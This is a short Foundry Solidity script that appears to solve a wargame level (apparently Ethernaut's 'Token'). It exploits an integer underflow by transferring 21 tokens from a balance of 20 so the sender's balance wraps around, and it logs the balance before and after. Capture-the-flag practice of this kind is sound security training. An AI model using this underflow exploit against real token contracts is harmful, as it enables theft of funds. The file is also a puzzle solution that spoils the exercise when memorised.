// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "../src/levels/05-Token/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Level05Solution is Script {
    Token tokenInstance = Token(0x05920d4E36a1A8eB611E1797e6a239249A8e2b30);

    function run() external {
        vm.startBroadcast();
        console.log("current token : ", tokenInstance.balanceOf(tx.origin));

        // interger overflow
        tokenInstance.transfer(address(0x05920d4E36a1A8eB611E1797e6a239249A8e2b30), 21);

        console.log("current token : ", tokenInstance.balanceOf(tx.origin));
        vm.stopBroadcast();
    }
}